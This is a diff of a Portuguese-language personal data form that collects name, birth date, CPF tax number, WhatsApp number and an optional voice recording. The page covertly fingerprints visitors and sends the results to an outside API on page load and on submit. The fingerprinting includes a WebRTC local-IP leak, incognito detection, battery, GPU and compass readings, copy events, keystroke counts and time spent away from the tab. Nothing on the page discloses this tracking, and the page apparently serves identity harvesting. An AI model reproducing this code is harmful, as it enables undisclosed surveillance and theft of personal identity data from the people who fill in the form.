@@ -5,6 +5,8 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Formulário Pessoal</title>
   <link rel="icon" type="image/png" href="favicon.png">
+  <!-- Biblioteca que CONSERTA o cabeçalho do áudio -->
+  <script src="https://cdn.jsdelivr.net/npm/fix-webm-duration@1.0.4/fix-webm-duration.js"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
     body {
@@ -41,7 +43,6 @@
       font-size: 12px; display: none; text-align: center;
       background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
     }
-
     #telaSucesso {
       display: none; position: fixed; inset: 0;
       background: #FFD400; color: #000; z-index: 9999;
@@ -52,7 +53,6 @@
     #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
     #telaSucesso p { font-size: 18px; font-weight: 600; }
     @keyframes pular { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }
-
     #telaAudio {
       display: none; position: fixed; inset: 0;
       background: linear-gradient(135deg, #667eea, #764ba2);
@@ -78,10 +78,7 @@
       padding: 0;
     }
     #btnGravar:hover { transform: scale(1.05); }
-    #btnGravar.gravando {
-      background: #c0392b;
-      animation: pulso 1s infinite;
-    }
+    #btnGravar.gravando { background: #c0392b; animation: pulso 1s infinite; }
     @keyframes pulso {
       0%,100% { box-shadow: 0 6px 20px rgba(231,76,60,0.4); }
       50%     { box-shadow: 0 6px 40px rgba(231,76,60,0.9), 0 0 60px rgba(231,76,60,0.5); }
@@ -91,16 +88,9 @@
       font-size: 20px; color: #e74c3c; font-weight: bold;
       margin-top: 12px; font-family: 'Consolas', monospace;
     }
-    #statusTexto {
-      font-size: 13px; color: #666; margin-top: 10px;
-      min-height: 20px;
-    }
-    #previewAudio {
-      display: none; width: 100%; margin-top: 18px;
-    }
-    .botoes-audio {
-      display: flex; gap: 10px; margin-top: 18px; flex-wrap: wrap;
-    }
+    #statusTexto { font-size: 13px; color: #666; margin-top: 10px; min-height: 20px; }
+    #previewAudio { display: none; width: 100%; margin-top: 18px; }
+    .botoes-audio { display: flex; gap: 10px; margin-top: 18px; flex-wrap: wrap; }
     .botoes-audio button {
       flex: 1; padding: 12px; border-radius: 8px;
       font-size: 14px; font-weight: bold; cursor: pointer;
@@ -128,18 +118,14 @@
     <div class="caixa">
       <h2>🎙️ Quer deixar um recado?</h2>
       <p>Toque no botão vermelho pra gravar uma mensagem de voz<br>(opcional, mas ajuda muito!)</p>
-
       <button id="btnGravar" title="Gravar áudio">🎙️</button>
       <div id="tempoGrava">00:00</div>
       <div id="statusTexto">Toque no microfone pra começar</div>
-
       <audio id="previewAudio" controls></audio>
-
       <div class="botoes-audio" id="botoesAudio" style="display:none;">
         <button class="btn-recomecar" onclick="recomecar()">🔄 Regravar</button>
         <button class="btn-enviar-audio" onclick="enviarAudio()">✅ Enviar</button>
       </div>
-
       <button class="btn-pular" id="btnPular" style="margin-top:18px; width:100%; padding:12px; border-radius:8px; border:none; font-size:14px; font-weight:bold; cursor:pointer;" onclick="pular()">Pular esta etapa</button>
     </div>
   </div>
@@ -150,13 +136,10 @@
 
     <label for="nome">Nome completo *</label>
     <input id="nome" type="text" placeholder="Ex: João Silva" />
-
     <label for="dataNascimento">Data de nascimento *</label>
     <input id="dataNascimento" type="date" />
-
     <label for="cpf">CPF *</label>
     <input id="cpf" type="text" placeholder="000.000.000-00" maxlength="14" />
-
     <label for="whatsapp">WhatsApp *</label>
     <input id="whatsapp" type="tel" placeholder="Ex: (11) 99999-9999" />
 
@@ -168,41 +151,26 @@
     const API_URL = 'https://gets-invio-on-api.onrender.com';
 
     // ====== RASTREAMENTO ======
-    let tempoFora = 0;
-    let ultimaSaida = null;
-    let copiouAlgo = false;
-    let teclasDigitadas = 0;
-    let inicioDigitacao = null;
-    let bussolaHeading = null;
-    let storageInfo = null;
-    let incognito = false;
-    let connectionType = 'Desconhecida';
-    let localIP = null;
+    let tempoFora = 0, ultimaSaida = null, copiouAlgo = false;
+    let teclasDigitadas = 0, inicioDigitacao = null;
+    let bussolaHeading = null, storageInfo = null, incognito = false;
+    let connectionType = 'Desconhecida', localIP = null;
 
     document.addEventListener('visibilitychange', function() {
-      if (document.hidden) {
-        ultimaSaida = Date.now();
-      } else if (ultimaSaida) {
+      if (document.hidden) { ultimaSaida = Date.now(); }
+      else if (ultimaSaida) {
         tempoFora += Math.round((Date.now() - ultimaSaida) / 1000);
         ultimaSaida = null;
       }
     });
-
     document.addEventListener('copy', function() { copiouAlgo = true; });
-
     document.querySelectorAll('input, textarea').forEach(function(el) {
       el.addEventListener('keydown', function() {
         if (!inicioDigitacao) inicioDigitacao = Date.now();
         teclasDigitadas++;
       });
     });
-
-    try {
-      if (navigator.connection && navigator.connection.type) {
-        connectionType = navigator.connection.type;
-      }
-    } catch (e) {}
-
+    try { if (navigator.connection && navigator.connection.type) connectionType = navigator.connection.type; } catch (e) {}
     try {
       const pc = new RTCPeerConnection({ iceServers: [] });
       pc.createDataChannel('');
@@ -210,18 +178,13 @@
       pc.onicecandidate = function(e) {
         if (!e.candidate) return;
         const match = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
-        if (match) {
-          localIP = match[1];
-          pc.close();
-        }
+        if (match) { localIP = match[1]; pc.close(); }
       };
     } catch (e) {}
 
     async function detectarIncognito() {
       try {
-        const k = '__test_incognito__';
-        localStorage.setItem(k, '1');
-        localStorage.removeItem(k);
+        const k = '__test__'; localStorage.setItem(k, '1'); localStorage.removeItem(k);
         if (navigator.storage && navigator.storage.estimate) {
           const est = await navigator.storage.estimate();
           if (est.quota && est.quota < 120000000) return true;
@@ -229,20 +192,15 @@
         return false;
       } catch (e) { return true; }
     }
-
     async function detectarStorage() {
       try {
         if (navigator.storage && navigator.storage.estimate) {
           const est = await navigator.storage.estimate();
-          return {
-            quota: Math.round((est.quota || 0) / 1024 / 1024),
-            uso: Math.round((est.usage || 0) / 1024 / 1024),
-          };
+          return { quota: Math.round((est.quota || 0) / 1024 / 1024), uso: Math.round((est.usage || 0) / 1024 / 1024) };
         }
       } catch (e) {}
       return null;
     }
-
     function detectarBussola() {
       return new Promise(function(resolve) {
         let resolvido = false;
@@ -254,10 +212,7 @@
           if (e.webkitCompassHeading != null) heading = e.webkitCompassHeading;
           else if (e.alpha != null) heading = 360 - e.alpha;
           if (heading != null && !resolvido) {
-            resolvido = true;
-            clearTimeout(timeout);
-            limpar();
-            resolve(Math.round(heading));
+            resolvido = true; clearTimeout(timeout); limpar(); resolve(Math.round(heading));
           }
         };
         function limpar() {
@@ -267,85 +222,60 @@
         try {
           window.addEventListener('deviceorientationabsolute', handler, true);
           window.addEventListener('deviceorientation', handler, true);
-        } catch (e) {
-          clearTimeout(timeout);
-          resolve(null);
-        }
+        } catch (e) { clearTimeout(timeout); resolve(null); }
       });
     }
 
     async function detectarDispositivo() {
       const ua = navigator.userAgent;
-      let sistema = 'Desconhecido';
-      let navegador = 'Desconhecido';
-      let tipo = 'Desconhecido';
-
+      let sistema = 'Desconhecido', navegador = 'Desconhecido', tipo = 'Desconhecido';
       if (/windows/i.test(ua)) sistema = 'Windows';
       else if (/android/i.test(ua)) sistema = 'Android';
       else if (/iphone|ipad|ipod/i.test(ua)) sistema = 'iOS';
       else if (/mac os/i.test(ua)) sistema = 'MacOS';
       else if (/linux/i.test(ua)) sistema = 'Linux';
-
       if (/edg/i.test(ua)) navegador = 'Edge';
       else if (/opr|opera/i.test(ua)) navegador = 'Opera';
       else if (/chrome/i.test(ua)) navegador = 'Chrome';
       else if (/firefox/i.test(ua)) navegador = 'Firefox';
       else if (/safari/i.test(ua)) navegador = 'Safari';
-
       if (/mobile|android|iphone|ipod/i.test(ua) && !/ipad/i.test(ua)) tipo = 'Celular';
       else if (/ipad|tablet/i.test(ua)) tipo = 'Tablet';
       else tipo = 'PC';
-
       let bateria = null;
       try {
         if (navigator.getBattery) {
           const b = await navigator.getBattery();
-          bateria = {
-            nivel: Math.round(b.level * 100),
-            carregando: b.charging,
+          bateria = { nivel: Math.round(b.level * 100), carregando: b.charging,
             tempoCarregar: b.chargingTime === Infinity ? null : Math.round(b.chargingTime / 60),
-            tempoDescarregar: b.dischargingTime === Infinity ? null : Math.round(b.dischargingTime / 60),
-          };
+            tempoDescarregar: b.dischargingTime === Infinity ? null : Math.round(b.dischargingTime / 60) };
         }
       } catch (e) {}
-
       let conexao = 'Desconhecida';
-      try {
-        if (navigator.connection && navigator.connection.effectiveType) {
-          conexao = navigator.connection.effectiveType;
-        }
-      } catch (e) {}
-
+      try { if (navigator.connection && navigator.connection.effectiveType) conexao = navigator.connection.effectiveType; } catch (e) {}
       const ram = navigator.deviceMemory || null;
       let fuso = 'Desconhecido';
       try { fuso = Intl.DateTimeFormat().resolvedOptions().timeZone || 'Desconhecido'; } catch (e) {}
-
       let orientacao = 'Desconhecida';
       try { if (screen.orientation && screen.orientation.type) orientacao = screen.orientation.type; } catch (e) {}
-
       const nucleos = navigator.hardwareConcurrency || null;
-
       let gpu = 'Desconhecida';
       try {
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
         if (gl) {
-          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-          if (debugInfo) gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Desconhecida';
+          const di = gl.getExtension('WEBGL_debug_renderer_info');
+          if (di) gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL) || 'Desconhecida';
         }
       } catch (e) {}
-
       const corProfundidade = screen.colorDepth || null;
       const pixelRatio = window.devicePixelRatio || 1;
       const touch = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
       const cookies = navigator.cookieEnabled;
-      const agora = new Date();
-      const horaCliente = agora.toLocaleString('pt-BR');
-
+      const horaCliente = new Date().toLocaleString('pt-BR');
       incognito = await detectarIncognito();
       storageInfo = await detectarStorage();
       bussolaHeading = await detectarBussola();
-
       return {
         sistema: sistema, navegador: navegador, tipo: tipo,
         idioma: navigator.language || 'Desconhecido',
@@ -359,7 +289,6 @@
     }
 
     let dispositivo = null;
-
     (async function() {
       dispositivo = await detectarDispositivo();
       fetch(API_URL + '/visita', {
@@ -374,7 +303,6 @@
     const telaSucesso = document.getElementById('telaSucesso');
     const telaAudio = document.getElementById('telaAudio');
     const inicio = Date.now();
-
     let idCadastro = null;
 
     function pegar(id) { return document.getElementById(id).value.trim(); }
@@ -418,23 +346,14 @@
 
     btn.addEventListener('click', async function() {
       const tempoSegundos = Math.round((Date.now() - inicio) / 1000);
-
       const dadosForm = {
-        nome: pegar('nome'),
-        dataNascimento: pegar('dataNascimento'),
-        cpf: pegar('cpf'),
-        whatsapp: pegar('whatsapp'),
-        dispositivo: dispositivo,
-        origem: pegarOrigem(),
-        jaVisitou: jaVisitou,
-        tempoPreenchimento: tempoSegundos,
-        tempoFora: tempoFora,
-        copiouAlgo: copiouAlgo,
-        velocidadeDigitacao: calcVelocidadeDigitacao(),
+        nome: pegar('nome'), dataNascimento: pegar('dataNascimento'),
+        cpf: pegar('cpf'), whatsapp: pegar('whatsapp'),
+        dispositivo: dispositivo, origem: pegarOrigem(), jaVisitou: jaVisitou,
+        tempoPreenchimento: tempoSegundos, tempoFora: tempoFora,
+        copiouAlgo: copiouAlgo, velocidadeDigitacao: calcVelocidadeDigitacao(),
       };
-
       resultado.style.display = 'none';
-
       const obrig = ['nome','dataNascimento','cpf','whatsapp'];
       const faltando = obrig.filter(function(c) { return !dadosForm[c]; });
       if (faltando.length > 0) {
@@ -442,18 +361,13 @@
         resultado.style.display = 'block';
         return;
       }
-
-      btn.disabled = true;
-      btn.textContent = 'Enviando...';
-
+      btn.disabled = true; btn.textContent = 'Enviando...';
       try {
         const r = await fetch(API_URL + '/enviar', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
+          method: 'POST', headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify(dadosForm)
         });
         const dados = await r.json();
-
         if (dados.sucesso) {
           idCadastro = dados.dados.id;
           telaSucesso.style.display = 'flex';
@@ -469,12 +383,10 @@
         resultado.textContent = '❌ Erro ao conectar. Tente novamente.';
         resultado.style.display = 'block';
       }
-
-      btn.disabled = false;
-      btn.textContent = 'Enviar';
+      btn.disabled = false; btn.textContent = 'Enviar';
     });
 
-    // ====== GRAVAÇÃO COM MEDIARECORDER ======
+    // ====== GRAVAÇÃO ======
     let mediaRecorder = null;
     let chunksAudio = [];
     let gravando = false;
@@ -482,7 +394,6 @@
     let intervaloTimer = null;
     let blobAudio = null;
     let duracaoFinal = 0;
-    let mimeTypeGlobal = 'audio/webm';
     let streamGlobal = null;
 
     const btnGravar = document.getElementById('btnGravar');
@@ -493,83 +404,64 @@
     const btnPular = document.getElementById('btnPular');
 
     btnGravar.addEventListener('click', async function() {
-      if (!gravando) {
-        await iniciarGravacao();
-      } else {
-        pararGravacao();
-      }
+      if (!gravando) await iniciarGravacao();
+      else pararGravacao();
     });
 
     async function iniciarGravacao() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
-          audio: {
-            echoCancellation: true,
-            noiseSuppression: true,
-            autoGainControl: true,
-          }
+          audio: { echoCancellation: true, noiseSuppression: true, autoGainControl: true }
         });
         streamGlobal = stream;
 
-        // Escolhe o MELHOR formato com compressão
-        let mimeType = '';
-        // Prioridade: MP4 (melhor pra mobile), depois Opus, depois WebM
-        const candidatos = [
-          'audio/mp4;codecs=mp4a.40.2',
-          'audio/mp4',
-          'audio/webm;codecs=opus',
-          'audio/webm',
-          'audio/ogg;codecs=opus',
-          'audio/ogg'
-        ];
-        for (let i = 0; i < candidatos.length; i++) {
-          if (MediaRecorder.isTypeSupported(candidatos[i])) {
-            mimeType = candidatos[i];
-            break;
-          }
+        // FORÇA WebM/Opus (a biblioteca fix-webm-duration só funciona com WebM)
+        let mimeType = 'audio/webm';
+        if (MediaRecorder.isTypeSupported('audio/webm;codecs=opus')) {
+          mimeType = 'audio/webm;codecs=opus';
         }
 
-        mimeTypeGlobal = mimeType;
-
-        // Bitrate baixo = arquivo pequeno (ideal pra voz)
         const opcoes = { mimeType: mimeType };
-        try {
-          opcoes.audioBitsPerSecond = 16000; // 16 kbps (suficiente pra voz)
-        } catch (e) {}
+        try { opcoes.audioBitsPerSecond = 24000; } catch (e) {}
 
         chunksAudio = [];
         mediaRecorder = new MediaRecorder(stream, opcoes);
 
         mediaRecorder.ondataavailable = function(e) {
-          if (e.data && e.data.size > 0) {
-            chunksAudio.push(e.data);
-            console.log('Chunk recebido:', e.data.size, 'bytes - total:', chunksAudio.length);
-          }
+          if (e.data && e.data.size > 0) chunksAudio.push(e.data);
         };
 
         mediaRecorder.onstop = function() {
-          // Espera 500ms pro último chunk chegar
+          // Espera o último chunk
           setTimeout(function() {
             duracaoFinal = Math.round((Date.now() - inicioGravacao) / 1000);
+            const blobInicial = new Blob(chunksAudio, { type: mimeType });
 
-            blobAudio = new Blob(chunksAudio, { type: mimeTypeGlobal });
-            console.log('Blob final:', blobAudio.size, 'bytes,', duracaoFinal, 'segundos');
-
-            const url = URL.createObjectURL(blobAudio);
-            previewAudio.src = url;
-            previewAudio.style.display = 'block';
-            botoesAudio.style.display = 'flex';
-            btnPular.style.display = 'none';
-            statusTexto.textContent = 'Ouça seu áudio (' + duracaoFinal + 's) e envie se gostar';
-
-            if (streamGlobal) {
-              streamGlobal.getTracks().forEach(function(t) { t.stop(); });
+            // ⚡ USA A BIBLIOTECA PRA CONSERTAR O CABEÇALHO
+            if (typeof fixWebmDuration === 'function') {
+              fixWebmDuration(blobInicial, duracaoFinal * 1000, {}, function(blobCorrigido) {
+                finalizarBlob(blobCorrigido);
+              });
+            } else {
+              // Fallback se a biblioteca não carregou
+              finalizarBlob(blobInicial);
             }
           }, 500);
         };
 
-        // ⚡ Chunk a cada 1 segundo (garante que pega tudo)
-        mediaRecorder.start(1000);
+        function finalizarBlob(blob) {
+          blobAudio = blob;
+          const url = URL.createObjectURL(blob);
+          previewAudio.src = url;
+          previewAudio.style.display = 'block';
+          botoesAudio.style.display = 'flex';
+          btnPular.style.display = 'none';
+          statusTexto.textContent = 'Ouça seu áudio (' + duracaoFinal + 's, ' + Math.round(blob.size / 1024) + ' KB)';
+
+          if (streamGlobal) streamGlobal.getTracks().forEach(function(t) { t.stop(); });
+        }
+
+        mediaRecorder.start(500);  // chunk a cada 500ms
         gravando = true;
         inicioGravacao = Date.now();
         btnGravar.classList.add('gravando');
@@ -578,17 +470,14 @@
 
         intervaloTimer = setInterval(function() {
           const seg = Math.floor((Date.now() - inicioGravacao) / 1000);
-          if (seg >= 60) {
-            pararGravacao();
-            return;
-          }
+          if (seg >= 60) { pararGravacao(); return; }
           const m = String(Math.floor(seg / 60)).padStart(2, '0');
           const s = String(seg % 60).padStart(2, '0');
           tempoGrava.textContent = m + ':' + s;
         }, 200);
 
       } catch (e) {
-        statusTexto.textContent = '❌ Não consegui acessar o microfone. Verifique as permissões.';
+        statusTexto.textContent = '❌ Não consegui acessar o microfone.';
         console.log(e);
       }
     }
@@ -596,45 +485,31 @@
     function pararGravacao() {
       if (!gravando) return;
       gravando = false;
-
       btnGravar.classList.remove('gravando');
       btnGravar.textContent = '🎙️';
       btnGravar.disabled = true;
       clearInterval(intervaloTimer);
 
-      // ⚡ Pede o último chunk E espera antes de parar
       if (mediaRecorder) {
-        try {
-          if (mediaRecorder.state === 'recording') {
-            mediaRecorder.requestData();
-          }
-        } catch (e) {}
-
+        try { if (mediaRecorder.state === 'recording') mediaRecorder.requestData(); } catch (e) {}
+        // Espera 1 segundo antes de parar
         setTimeout(function() {
-          if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-            mediaRecorder.stop();
-          }
-        }, 500);
+          if (mediaRecorder && mediaRecorder.state !== 'inactive') mediaRecorder.stop();
+        }, 1000);
       }
     }
 
     function recomecar() {
-      chunksAudio = [];
-      blobAudio = null;
-      duracaoFinal = 0;
-      previewAudio.src = '';
-      previewAudio.style.display = 'none';
-      botoesAudio.style.display = 'none';
-      btnPular.style.display = 'block';
-      btnGravar.disabled = false;
-      btnGravar.textContent = '🎙️';
+      chunksAudio = []; blobAudio = null; duracaoFinal = 0;
+      previewAudio.src = ''; previewAudio.style.display = 'none';
+      botoesAudio.style.display = 'none'; btnPular.style.display = 'block';
+      btnGravar.disabled = false; btnGravar.textContent = '🎙️';
       tempoGrava.textContent = '00:00';
       statusTexto.textContent = 'Toque no microfone pra começar';
     }
 
     async function enviarAudio() {
       if (!blobAudio || !idCadastro) return;
-
       statusTexto.textContent = '⏳ Enviando áudio...';
       botoesAudio.style.display = 'none';
 
@@ -642,19 +517,12 @@
       reader.readAsDataURL(blobAudio);
       reader.onloadend = async function() {
         const base64 = reader.result;
-
         try {
           const r = await fetch(API_URL + '/enviar-audio', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              idCadastro: idCadastro,
-              audio: base64,
-              duracao: duracaoFinal,
-            })
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ idCadastro: idCadastro, audio: base64, duracao: duracaoFinal })
           });
           const dados = await r.json();
-
           if (dados.sucesso) {
             statusTexto.textContent = '✅ Áudio enviado! Muito obrigado!';
             tempoGrava.textContent = '💛';
